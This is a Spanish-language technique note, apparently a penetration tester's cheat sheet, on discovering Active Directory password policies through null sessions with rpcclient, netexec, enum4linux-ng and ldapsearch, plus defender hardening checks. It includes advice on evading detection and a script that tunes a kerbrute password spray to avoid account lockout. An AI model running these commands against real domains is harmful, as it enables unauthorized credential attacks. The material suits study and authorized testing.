---
aliases:
  - Anonymous getdompwinfo
  - Null Session Policy
  - Pre-Auth Policy Recon
tags:
  - type/technique
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: Technique
linked:
  - '[[AD - Password Policy Enumeration]]'
---
# AD - Password Policy Enumeration - Anonymous Policy Discovery

***

## RPC Anonymous (rpcclient)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `rpcclient -U "" <DC> -N -c 'getdompwinfo'` | Policy via null SAMR | Test misconfig. |
| `rpcclient -U "" <DC> -N -c 'querydominfo'` | Domain info detallado | Alternativa. |
| `rpcclient -U "" <DC> -N -c 'enumdomains'` | Enum domains anónimo | Bootstrap. |
| `rpcclient -U "" <DC> -N -c 'lsaquery'` | Domain SID + name | Pre-spray context. |
^ad-anon-rpcclient

**Hardening defaults:** Win2019+ bloquea null SAMR. `RestrictAnonymous=2` y `RestrictAnonymousSAM=1` en registry. Si pega = legacy/misconfig.

```bash
# Sweep null contra todos DCs
for dc in $(dig +short SRV "_ldap._tcp.dc._msdcs.corp.local" | awk '{print $4}' | sed 's/\.$//'); do
  echo "=== $dc ==="
  rpcclient -U "" "$dc" -N -c 'getdompwinfo' 2>/dev/null
done
```

___

## netexec / crackmapexec Anonymous

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc smb <DC> -u '' -p '' --pass-pol` | Policy null session | Test misconfig. |
| `nxc smb <DC> -u 'guest' -p '' --pass-pol` | Fallback Guest | Si null blocked. |
| `nxc smb 10.0.0.0/24 -u '' -p '' --pass-pol` | Sweep subnet | Bulk discovery. |
^ad-anon-netexec

```bash
# Quick bulk
nxc smb 10.0.0.0/24 -u '' -p '' --pass-pol 2>&1 | grep -E "Minimum|Lockout"
```

___

## enum4linux-ng

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `enum4linux-ng -P <DC>` | Solo password policy | Targeted. |
| `enum4linux-ng -A <DC>` | Comprehensive (incluye -P) | Full anon recon. |
| `enum4linux-ng -A <DC> -oJ enum.json` | JSON parseable | Pipeline. |
| `enum4linux -P <DC>` | Legacy fallback | Sin -ng. |
^ad-anon-enum4linux

```bash
enum4linux-ng -P <DC> 2>&1 | grep -A 20 "Password Policy"
```

___

## LDAP Anonymous (Limited)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ldapsearch -x -h <DC> -s base -b "DC=corp,DC=local" minPwdLength` | Anonymous LDAP query | Mostly bloqueado modern. |
| `ldapsearch -x -h <DC> -s base -b "" namingContexts` | RootDSE (siempre allowed) | Bootstrap. |
^ad-anon-ldap

**Realidad:** anonymous LDAP read sobre password policy attrs casi siempre bloqueado Win2019+. RPC vía SAMR es path más probable si null permitido.

___

## OPSEC Considerations

| **Comando** | **Notas** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc smb <DC> -u '' -p '' --pass-pol` | Single anonymous hit | Stealth (1 query). |
| Spread queries entre múltiples DCs | Reduce signature per-DC | Multi-DC env. |
| Auditpol: subcategory `Logon` events | Detection window | Defender side. |
| Event ID 4625 (failed logon) anónimo | Logueado siempre | Sigue alarmando. |
^ad-anon-opsec

**Detection:** anonymous SAMR queries logean Event 4661 (Object Access). MDI flag bulk anonymous como recon. Limit a 1 query por DC.

___

## Cross-Correlation with Spray Results

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `(nxc smb <DC> -u '' -p '' --pass-pol \| grep -i "Lockout Threshold")` | Threshold pre-spray | Cálculo safe attempts. |
| `kerbrute passwordspray --dc <DC> -d corp.local users.txt 'pwd' --delay <window-ms>` | Spray con pacing del policy | Adaptive. |
^ad-anon-correlation

```bash
# Pipeline: anon policy → safe spray
TH=$(nxc smb <DC> -u '' -p '' --pass-pol 2>&1 | grep -i "Lockout Threshold" | awk '{print $NF}')
WINDOW=$(nxc smb <DC> -u '' -p '' --pass-pol 2>&1 | grep -i "Reset" | awk '{print $NF}')

echo "Safe attempts per user: $((TH - 1)) every $((WINDOW + 1))min"

# Adapt spray rate
kerbrute passwordspray --dc <DC> -d corp.local users.txt 'Spring2026!' \
  --delay $(((WINDOW + 1) * 60 * 1000 / (TH - 1)))
```

___

## Defender Hardening Indicators

| **Test** | **Resultado bueno (hardened)** | **Resultado malo (vuln)** |
|:---:|:---:|:---:|
| `rpcclient -U "" <DC> -N -c 'getdompwinfo'` | `NT_STATUS_ACCESS_DENIED` | Policy retornado. |
| `nxc smb <DC> -u '' -p '' --pass-pol` | Connection denied / auth required | Policy retornado. |
| `nxc smb <DC> -u 'guest' -p '' --pass-pol` | Guest disabled | Policy retornado. |
| `enum4linux-ng -A <DC>` | Mínima info | Bulk data. |
| `ldapsearch -x -h <DC>` anonymous | Solo RootDSE | Domain attrs. |
^ad-anon-defender

**Hardening recomendado defender side:**
- `HKLM\System\CurrentControlSet\Control\Lsa\RestrictAnonymous = 2`
- `HKLM\System\CurrentControlSet\Control\Lsa\RestrictAnonymousSAM = 1`
- Disable Guest account.
- LDAP signing/binding required.
- Remove `Pre-Windows 2000 Compatible Access` group members (legacy compat).

***
